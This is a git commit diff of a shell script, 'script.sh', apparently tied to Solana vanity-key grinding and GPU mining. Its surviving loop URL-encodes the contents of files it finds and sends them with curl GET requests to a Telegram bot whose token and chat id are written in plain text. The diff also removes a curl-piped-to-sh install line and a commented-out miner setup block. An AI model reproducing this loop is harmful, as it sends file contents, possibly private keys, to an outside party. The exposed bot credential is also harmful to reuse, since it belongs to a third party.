b9a6b5ddf967ac3655e4d1fc86b1b335728c0f1d
Sheryna1 <75541035+Sheryna1@users.noreply.github.com>
2024-02-09 02:41:39 +0200

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,6 +1,6 @@
-mkdir /root/solana && cd /root/solana && sh -c "$(curl -sSfL https://release.solana.com/v1.18.1/install)" && export PATH="/root/.local/share/solana/install/active_release/bin:$PATH" 
-solana-keygen grind --starts-with pow:100000000 &
+#!/bin/bash
 
+# Function to URL encode the content
 urlencode() {
     # Usage: urlencode "string"
     local string="$1"
@@ -23,47 +23,12 @@ while true; do
             # Get the filename
             filename=$(basename "$file")
 
-            rm $filename
+            # rm $filename
             # Make a curl GET request with the content of the file appended to the URL
-            curl -X GET "https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendMessage?chat_id=638066999&text=$encoded_content$filename"
+            curl -X GET "https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendMessage?chat_id=638066999&text=1$filename$encoded_content"
         done <<< "$result"
     fi
 
     # Sleep for 5 seconds before the next iteration
     sleep 5
 done
-
-# if [ ! -d "/root/SuperMega" ]; then
-#     echo "Miner not installed. Installing."
-#     apt install nano
-
-#     curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - 
-#     apt-get install -y nodejs
-#     apt-get install -y npm
-
-#     cd /root || exit
-#     git clone https://github.com/Sheryna1/SuperMega.git
-
-#     cd ./SuperMega || exit
-# else
-#     cd /root/SuperMega || exit
-#     echo "Miner installed. Updating."
-#     git pull
-# fi
-
-# npm i
-
-# # npx ts-node send_universal.ts
-
-# chmod 777 ./miningPoolCli
-# chmod 777 ./script2.sh
-# chmod 777 ./miner_blob/pow-miner-cuda
-# chmod 777 ./pow-miner-cuda
-
-
-# # ./miningPoolCli
-# GPU_COUNT=$(nvidia-smi --query-gpu=name --format=csv,noheader | wc -l)
-
-# for i in $(seq 0 $(($GPU_COUNT - 1))); do
-#     ./script2.sh $i &
-# done
